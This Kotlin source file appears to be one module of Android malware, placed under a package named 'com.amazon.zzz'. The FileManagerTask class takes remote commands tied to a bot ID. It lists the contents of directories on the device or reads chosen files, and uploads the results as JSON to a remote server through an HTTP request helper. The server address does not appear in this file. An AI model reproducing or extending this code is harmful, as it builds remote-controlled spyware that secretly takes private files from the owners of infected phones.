package com.amazon.zzz.Modull.task

import android.content.Context
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Utilsss.SharedPreferencess
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject

class FileManagerTask(ctx: Context, val req: Int, val path: String) : BaseTask(ctx) {

    override fun run() {
        super.run()
        runCatching {
            work(req, path)
        }.onFailure {
            apiUt.sendLogs(ctx, "", "FileManagerTask ${it.localizedMessage}", "error")
        }
    }

    private fun work(req: Int, path: String) = GlobalScope.launch {
        runCatching {
            when (req) {
                0 -> {
                    val data = JSONObject()
                    data.put("uid", SharedPreferencess.idbot)
                    data.put("info", FileManagerrw.walk(ctx, path).toString())
                    data.put("command", "walk")
                    apiUt.httpRequest(data.toString())
                    apiUt.sendLogs(ctx, "", "FileManagerTask walk", "success")
                }

                1 -> {
                    FileManagerrw.downloadFile(ctx, path)?.let {
                        val data = JSONObject()
                        data.put("uid", SharedPreferencess.idbot)
                        data.put("path", path)
                        data.put("file", it.toString())
                        data.put("command", "file")
                        apiUt.httpRequest(data.toString())
                        apiUt.sendLogs(ctx, "", "FileManagerTask file", "success")
                    }
                }

                else -> {
                }
            }
        }.onFailure {
            apiUt.sendLogs(ctx, "", "FileManagerTask ${it.localizedMessage}", "error")
        }
    }

}